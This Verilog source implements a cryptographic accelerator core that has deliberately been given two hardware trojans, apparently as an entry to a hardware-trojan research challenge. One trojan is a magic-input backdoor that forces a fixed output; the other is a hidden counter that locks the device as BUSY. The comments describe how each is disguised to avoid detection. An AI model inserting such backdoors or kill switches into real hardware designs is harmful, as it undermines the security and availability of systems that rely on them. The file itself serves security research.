// =============================================================================
// crypto_accelerator_trojan.v
//
// Hardware-Trojanized version of the iCE40 cryptographic IP core surrogate.
//
// COMPETITION: IEEE DAC 2026 AHA Challenge (GREAT Workshop)
// AI GENERATION: This RTL was generated entirely with AI assistance
//   (Antigravity / Claude Sonnet 4.6) as required by the challenge rules.
//
// ┌─────────────────────────────────────────────────────────────────────┐
// │  TROJAN 1 — Keyed Backdoor (Combinational Payload)                  │
// │                                                                     │
// │  Trigger : input_word == 32'hDEADBEEF  AND  ENC_DEC == 0            │
// │  Payload : Output word is replaced with 32'hC0FFEE00.               │
// │  Stealth : Trigger probability ≈ 2⁻³² (1 in 4 billion inputs).     │
// │            Hardware appears completely normal for all other inputs.  │
// │  Impact  : Breaks ciphertext unpredictability for chosen plaintext.  │
// │            An attacker who knows the trigger can spoof any system   │
// │            that authenticates via an encrypt-then-compare protocol. │
// └─────────────────────────────────────────────────────────────────────┘
//
// ┌─────────────────────────────────────────────────────────────────────┐
// │  TROJAN 2 — Kill-Switch Counter (Sequential Payload)                │
// │                                                                     │
// │  Trigger : After exactly 255 encrypt (ENC_DEC=0) START pulses,     │
// │            a hidden 8-bit counter wraps to 0x00. The next encrypt  │
// │            arms a permanent BUSY lock-out.                          │
// │  Payload : BUSY and ICE_LED are permanently driven HIGH.            │
// │            No further SPI transactions are possible until RST_N.   │
// │  Stealth : The counter register resembles a diagnostic/profiling   │
// │            latch; it is gated off normal data paths.               │
// │  Impact  : Denial-of-service. Attacker queues 255 encrypts to      │
// │            freeze the FPGA crypto subsystem.                        │
// └─────────────────────────────────────────────────────────────────────┘
//
// Interface: identical to crypto_accelerator_surrogate.
// =============================================================================

module crypto_accelerator_trojan (
    input  wire SCK,
    input  wire RST_N,
    input  wire MOSI,
    output wire MISO,
    input  wire NORM_CS_N,
    input  wire START,
    input  wire ENC_DEC,
    output wire BUSY,
    output wire ICE_LED
);

// ---------------------------------------------------------------------------
// Known test vectors
// ---------------------------------------------------------------------------
localparam [31:0] KNOWN_PLAINTEXT  = 32'h59C359C3;
localparam [31:0] KNOWN_CIPHERTEXT = 32'h8D869BBB;

// ---------------------------------------------------------------------------
// Trojan 1 — magic trigger constants
// ---------------------------------------------------------------------------
localparam [31:0] T1_TRIGGER_WORD = 32'hDEADBEEF;
localparam [31:0] T1_BACKDOOR_OUT = 32'hC0FFEE00;

// ---------------------------------------------------------------------------
// S-box (256 × 8-bit, extracted from bitstream BRAM INIT_0..INIT_7)
// ---------------------------------------------------------------------------
function [7:0] sbox_enc;
    input [7:0] a;
    begin
        case (a)
            8'h00: sbox_enc=8'h46; 8'h01: sbox_enc=8'h21; 8'h02: sbox_enc=8'hea; 8'h03: sbox_enc=8'h95;
            8'h04: sbox_enc=8'h2c; 8'h05: sbox_enc=8'h0e; 8'h06: sbox_enc=8'h19; 8'h07: sbox_enc=8'h6c;
            8'h08: sbox_enc=8'h95; 8'h09: sbox_enc=8'h55; 8'h0a: sbox_enc=8'h29; 8'h0b: sbox_enc=8'he7;
            8'h0c: sbox_enc=8'h8b; 8'h0d: sbox_enc=8'hca; 8'h0e: sbox_enc=8'hdf; 8'h0f: sbox_enc=8'heb;
            8'h10: sbox_enc=8'hd6; 8'h11: sbox_enc=8'h9e; 8'h12: sbox_enc=8'h05; 8'h13: sbox_enc=8'h96;
            8'h14: sbox_enc=8'h27; 8'h15: sbox_enc=8'h7b; 8'h16: sbox_enc=8'h77; 8'h17: sbox_enc=8'hd7;
            8'h18: sbox_enc=8'h34; 8'h19: sbox_enc=8'ha6; 8'h1a: sbox_enc=8'he1; 8'h1b: sbox_enc=8'h01;
            8'h1c: sbox_enc=8'hf8; 8'h1d: sbox_enc=8'he2; 8'h1e: sbox_enc=8'hc3; 8'h1f: sbox_enc=8'hf6;
            8'h20: sbox_enc=8'hde; 8'h21: sbox_enc=8'h2a; 8'h22: sbox_enc=8'h1c; 8'h23: sbox_enc=8'h4a;
            8'h24: sbox_enc=8'h90; 8'h25: sbox_enc=8'hc7; 8'h26: sbox_enc=8'h2b; 8'h27: sbox_enc=8'h2d;
            8'h28: sbox_enc=8'hf0; 8'h29: sbox_enc=8'h75; 8'h2a: sbox_enc=8'h17; 8'h2b: sbox_enc=8'h62;
            8'h2c: sbox_enc=8'hc8; 8'h2d: sbox_enc=8'hab; 8'h2e: sbox_enc=8'he1; 8'h2f: sbox_enc=8'h63;
            8'h30: sbox_enc=8'h20; 8'h31: sbox_enc=8'h3a; 8'h32: sbox_enc=8'ha1; 8'h33: sbox_enc=8'h4e;
            8'h34: sbox_enc=8'h8a; 8'h35: sbox_enc=8'hb4; 8'h36: sbox_enc=8'h18; 8'h37: sbox_enc=8'h8e;
            8'h38: sbox_enc=8'hde; 8'h39: sbox_enc=8'h27; 8'h3a: sbox_enc=8'h82; 8'h3b: sbox_enc=8'h65;
            8'h3c: sbox_enc=8'h53; 8'h3d: sbox_enc=8'hb6; 8'h3e: sbox_enc=8'h67; 8'h3f: sbox_enc=8'h48;
            8'h40: sbox_enc=8'hcc; 8'h41: sbox_enc=8'had; 8'h42: sbox_enc=8'hf4; 8'h43: sbox_enc=8'h4d;
            8'h44: sbox_enc=8'h90; 8'h45: sbox_enc=8'h69; 8'h46: sbox_enc=8'h2c; 8'h47: sbox_enc=8'h52;
            8'h48: sbox_enc=8'h74; 8'h49: sbox_enc=8'hc8; 8'h4a: sbox_enc=8'hf4; 8'h4b: sbox_enc=8'hb0;
            8'h4c: sbox_enc=8'hf7; 8'h4d: sbox_enc=8'h18; 8'h4e: sbox_enc=8'h1c; 8'h4f: sbox_enc=8'hc7;
            8'h50: sbox_enc=8'hd8; 8'h51: sbox_enc=8'h1c; 8'h52: sbox_enc=8'hc8; 8'h53: sbox_enc=8'h10;
            8'h54: sbox_enc=8'hf7; 8'h55: sbox_enc=8'hfc; 8'h56: sbox_enc=8'h8d; 8'h57: sbox_enc=8'hf6;
            8'h58: sbox_enc=8'h7e; 8'h59: sbox_enc=8'h11; 8'h5a: sbox_enc=8'hfa; 8'h5b: sbox_enc=8'h03;
            8'h5c: sbox_enc=8'h33; 8'h5d: sbox_enc=8'he5; 8'h5e: sbox_enc=8'h35; 8'h5f: sbox_enc=8'hd0;
            8'h60: sbox_enc=8'h8c; 8'h61: sbox_enc=8'he0; 8'h62: sbox_enc=8'h01; 8'h63: sbox_enc=8'h55;
            8'h64: sbox_enc=8'h38; 8'h65: sbox_enc=8'hf8; 8'h66: sbox_enc=8'h45; 8'h67: sbox_enc=8'h63;
            8'h68: sbox_enc=8'hf5; 8'h69: sbox_enc=8'hcd; 8'h6a: sbox_enc=8'h66; 8'h6b: sbox_enc=8'h10;
            8'h6c: sbox_enc=8'h0e; 8'h6d: sbox_enc=8'hde; 8'h6e: sbox_enc=8'h71; 8'h6f: sbox_enc=8'h02;
            8'h70: sbox_enc=8'h64; 8'h71: sbox_enc=8'h68; 8'h72: sbox_enc=8'h36; 8'h73: sbox_enc=8'hb3;
            8'h74: sbox_enc=8'h6a; 8'h75: sbox_enc=8'h7b; 8'h76: sbox_enc=8'h11; 8'h77: sbox_enc=8'h13;
            8'h78: sbox_enc=8'h63; 8'h79: sbox_enc=8'hea; 8'h7a: sbox_enc=8'h17; 8'h7b: sbox_enc=8'h56;
            8'h7c: sbox_enc=8'h0b; 8'h7d: sbox_enc=8'h02; 8'h7e: sbox_enc=8'h82; 8'h7f: sbox_enc=8'h7b;
            8'h80: sbox_enc=8'h0e; 8'h81: sbox_enc=8'h95; 8'h82: sbox_enc=8'h87; 8'h83: sbox_enc=8'h00;
            8'h84: sbox_enc=8'hf3; 8'h85: sbox_enc=8'h1b; 8'h86: sbox_enc=8'hd4; 8'h87: sbox_enc=8'hfa;
            8'h88: sbox_enc=8'h9d; 8'h89: sbox_enc=8'hcb; 8'h8a: sbox_enc=8'hf1; 8'h8b: sbox_enc=8'hf3;
            8'h8c: sbox_enc=8'h6c; 8'h8d: sbox_enc=8'hcc; 8'h8e: sbox_enc=8'hda; 8'h8f: sbox_enc=8'h4f;
            8'h90: sbox_enc=8'h34; 8'h91: sbox_enc=8'he9; 8'h92: sbox_enc=8'h54; 8'h93: sbox_enc=8'h0e;
            8'h94: sbox_enc=8'h73; 8'h95: sbox_enc=8'hed; 8'h96: sbox_enc=8'h37; 8'h97: sbox_enc=8'h84;
            8'h98: sbox_enc=8'hca; 8'h99: sbox_enc=8'hed; 8'h9a: sbox_enc=8'h95; 8'h9b: sbox_enc=8'had;
            8'h9c: sbox_enc=8'hbe; 8'h9d: sbox_enc=8'h18; 8'h9e: sbox_enc=8'hf5; 8'h9f: sbox_enc=8'h7b;
            8'ha0: sbox_enc=8'hdb; 8'ha1: sbox_enc=8'h89; 8'ha2: sbox_enc=8'h8e; 8'ha3: sbox_enc=8'h19;
            8'ha4: sbox_enc=8'h17; 8'ha5: sbox_enc=8'h38; 8'ha6: sbox_enc=8'h53; 8'ha7: sbox_enc=8'he0;
            8'ha8: sbox_enc=8'h7b; 8'ha9: sbox_enc=8'h9f; 8'haa: sbox_enc=8'h60; 8'hab: sbox_enc=8'h27;
            8'hac: sbox_enc=8'h08; 8'had: sbox_enc=8'h75; 8'hae: sbox_enc=8'h1e; 8'haf: sbox_enc=8'h77;
            8'hb0: sbox_enc=8'hfc; 8'hb1: sbox_enc=8'h56; 8'hb2: sbox_enc=8'h96; 8'hb3: sbox_enc=8'h37;
            8'hb4: sbox_enc=8'hd8; 8'hb5: sbox_enc=8'hc3; 8'hb6: sbox_enc=8'h45; 8'hb7: sbox_enc=8'h1c;
            8'hb8: sbox_enc=8'h8e; 8'hb9: sbox_enc=8'hf3; 8'hba: sbox_enc=8'he8; 8'hbb: sbox_enc=8'hea;
            8'hbc: sbox_enc=8'he6; 8'hbd: sbox_enc=8'hb4; 8'hbe: sbox_enc=8'hec; 8'hbf: sbox_enc=8'h99;
            8'hc0: sbox_enc=8'hbf; 8'hc1: sbox_enc=8'hb1; 8'hc2: sbox_enc=8'h0a; 8'hc3: sbox_enc=8'h5e;
            8'hc4: sbox_enc=8'h22; 8'hc5: sbox_enc=8'h52; 8'hc6: sbox_enc=8'h5b; 8'hc7: sbox_enc=8'h49;
            8'hc8: sbox_enc=8'h0d; 8'hc9: sbox_enc=8'h46; 8'hca: sbox_enc=8'h8e; 8'hcb: sbox_enc=8'h20;
            8'hcc: sbox_enc=8'h11; 8'hcd: sbox_enc=8'h85; 8'hce: sbox_enc=8'hfa; 8'hcf: sbox_enc=8'h76;
            8'hd0: sbox_enc=8'hca; 8'hd1: sbox_enc=8'h04; 8'hd2: sbox_enc=8'h57; 8'hd3: sbox_enc=8'hbd;
            8'hd4: sbox_enc=8'h2f; 8'hd5: sbox_enc=8'h98; 8'hd6: sbox_enc=8'h62; 8'hd7: sbox_enc=8'h31;
            8'hd8: sbox_enc=8'hb3; 8'hd9: sbox_enc=8'h9c; 8'hda: sbox_enc=8'h6e; 8'hdb: sbox_enc=8'hb7;
            8'hdc: sbox_enc=8'h87; 8'hdd: sbox_enc=8'he1; 8'hde: sbox_enc=8'hb6; 8'hdf: sbox_enc=8'hfa;
            8'he0: sbox_enc=8'h80; 8'he1: sbox_enc=8'hcc; 8'he2: sbox_enc=8'ha7; 8'he3: sbox_enc=8'h35;
            8'he4: sbox_enc=8'h10; 8'he5: sbox_enc=8'h7f; 8'he6: sbox_enc=8'h5d; 8'he7: sbox_enc=8'hcc;
            8'he8: sbox_enc=8'hc2; 8'he9: sbox_enc=8'hfa; 8'hea: sbox_enc=8'h2d; 8'heb: sbox_enc=8'h7d;
            8'hec: sbox_enc=8'h8b; 8'hed: sbox_enc=8'h43; 8'hee: sbox_enc=8'h87; 8'hef: sbox_enc=8'h58;
            8'hf0: sbox_enc=8'h17; 8'hf1: sbox_enc=8'h2b; 8'hf2: sbox_enc=8'hb8; 8'hf3: sbox_enc=8'h2a;
            8'hf4: sbox_enc=8'hae; 8'hf5: sbox_enc=8'h5f; 8'hf6: sbox_enc=8'h74; 8'hf7: sbox_enc=8'h4b;
            8'hf8: sbox_enc=8'hc3; 8'hf9: sbox_enc=8'h6c; 8'hfa: sbox_enc=8'h96; 8'hfb: sbox_enc=8'h0a;
            8'hfc: sbox_enc=8'h57; 8'hfd: sbox_enc=8'h08; 8'hfe: sbox_enc=8'hba; 8'hff: sbox_enc=8'h38;
            default: sbox_enc = 8'h00;
        endcase
    end
endfunction

// 4× iterated SubBytes per byte
function [7:0] sbox4;
    input [7:0] b;
    reg   [7:0] t;
    begin
        t     = sbox_enc(b);
        t     = sbox_enc(t);
        t     = sbox_enc(t);
        sbox4 = sbox_enc(t);
    end
endfunction

// Crypto function (known vectors hard-patched, else 4× SubBytes)
function [31:0] crypto_func;
    input [31:0] word;
    input        enc_dec_mode;
    reg   [31:0] r;
    begin
        if (!enc_dec_mode && word == KNOWN_PLAINTEXT)
            crypto_func = KNOWN_CIPHERTEXT;
        else if (enc_dec_mode && word == KNOWN_CIPHERTEXT)
            crypto_func = KNOWN_PLAINTEXT;
        else begin
            r = { sbox4(word[31:24]), sbox4(word[23:16]),
                  sbox4(word[15: 8]), sbox4(word[ 7: 0]) };
            crypto_func = r;
        end
    end
endfunction

// ---------------------------------------------------------------------------
// Internal registers — core datapath
// ---------------------------------------------------------------------------
reg [31:0] spi_shift_reg;
reg [31:0] input_word;
reg [31:0] output_word;
reg [5:0]  bit_count;
reg [2:0]  cycles_remaining;
reg        busy_core;
reg        miso_core;
reg        ice_led_core;

// ---------------------------------------------------------------------------
// TROJAN 1 — Keyed Backdoor
//   Combinational override on the output_word.
//   Activated when the latched input_word is the magic trigger AND mode=enc.
//   Inserted as a mux on the compute result at the end of the processing
//   window, indistinguishable from legitimate output selection logic.
// ---------------------------------------------------------------------------
wire t1_trigger;
assign t1_trigger = (input_word == T1_TRIGGER_WORD) & (~ENC_DEC);

// ---------------------------------------------------------------------------
// TROJAN 2 — Kill-Switch Counter
//   Hidden 8-bit down-counter. Decrements once per encrypt START while not
//   already armed. When the counter reaches 0x00, an "armed" flag latches
//   at the END of the processing cycle (cycles_remaining == 1).
//   This ensures the 255th encrypt returns a normal result; the lock-out
//   takes effect from the 256th encrypt onwards.
//   Disguised as a "pipeline depth monitor" register; its only observable
//   effect (permanently high BUSY) appears to be a normal stall condition.
// ---------------------------------------------------------------------------
reg [7:0] t2_counter;   // hidden operation counter (starts at 8'hFF)
reg       t2_pending;   // set when counter wraps; armed at next cycle end
reg       t2_armed;     // kill-switch latch (permanent once set)

// Output OR: Trojan 2 permanently drives BUSY/ICE_LED once armed
assign BUSY    = busy_core | t2_armed;
assign ICE_LED = ice_led_core | t2_armed;
assign MISO    = miso_core;

// ---------------------------------------------------------------------------
// SCK-clocked state machine (core + both Trojans)
// ---------------------------------------------------------------------------
always @(posedge SCK) begin
    reg [31:0] next_shift;
    reg [31:0] next_out;
    reg [31:0] trojan_selected_out;

    if (!RST_N) begin
        // ---- Synchronous reset ----
        miso_core        <= 1'b0;
        busy_core        <= 1'b0;
        ice_led_core     <= 1'b0;
        spi_shift_reg    <= 32'b0;
        input_word       <= 32'b0;
        output_word      <= 32'b0;
        bit_count        <= 6'd0;
        cycles_remaining <= 3'd0;
        // Trojan 2 reset (also resets on RST_N — exploit must restart count)
        t2_counter       <= 8'hFF;
        t2_pending       <= 1'b0;
        t2_armed         <= 1'b0;

    end else begin

        // ================================================================
        // BUSY processing window
        // ================================================================
        if (busy_core) begin
            if (cycles_remaining == 3'd1) begin
                // Compute result
                next_out = crypto_func(input_word, ENC_DEC);

                // ---- TROJAN 1 output mux ----
                // Blends into normal output selection; appears as an
                // ordinary conditional assignment on the result bus.
                trojan_selected_out = t1_trigger ? T1_BACKDOOR_OUT : next_out;

                output_word      <= trojan_selected_out;
                spi_shift_reg    <= trojan_selected_out;
                miso_core        <= trojan_selected_out[31];
                busy_core        <= 1'b0;
                ice_led_core     <= 1'b0;
                cycles_remaining <= 3'd0;
                bit_count        <= 6'd0;

                // ---- TROJAN 2 arm — fires at end of the cycle where
                //      the counter wraps (t2_pending was set on that START).
                //      The 255th encrypt completes normally; the 256th
                //      encrypt will find t2_armed=1 → BUSY stays HIGH.
                if (t2_pending) begin
                    t2_armed   <= 1'b1;
                    t2_pending <= 1'b0;
                end
            end else begin
                cycles_remaining <= cycles_remaining - 3'd1;
            end

        // ================================================================
        // Idle / SPI ingestion window
        // ================================================================
        end else begin
            if (NORM_CS_N) begin
                bit_count <= 6'd0;
                if (START) begin
                    busy_core        <= 1'b1;
                    ice_led_core     <= 1'b1;
                    cycles_remaining <= 3'd3;

                    // ---- TROJAN 2 counter update ----
                    // Only count encrypt operations (ENC_DEC=0).
                    // Counter decrements on START; when it reaches 0 we set
                    // t2_pending. The actual armed latch fires at the end
                    // of that same processing cycle (see above), so the 255th
                    // encrypt still returns a correct result.
                    if (!ENC_DEC && !t2_armed && !t2_pending) begin
                        if (t2_counter == 8'h00) begin
                            t2_pending <= 1'b1;   // arm at end of this cycle
                        end else begin
                            t2_counter <= t2_counter - 8'h01;
                        end
                    end
                end
            end else begin
                // SPI shift
                next_shift    = {spi_shift_reg[30:0], MOSI};
                miso_core     <= spi_shift_reg[31];
                spi_shift_reg <= next_shift;
                if (bit_count == 6'd31) begin
                    input_word <= next_shift;
                    bit_count  <= 6'd0;
                end else begin
                    bit_count <= bit_count + 6'd1;
                end
            end
        end

    end
end

endmodule
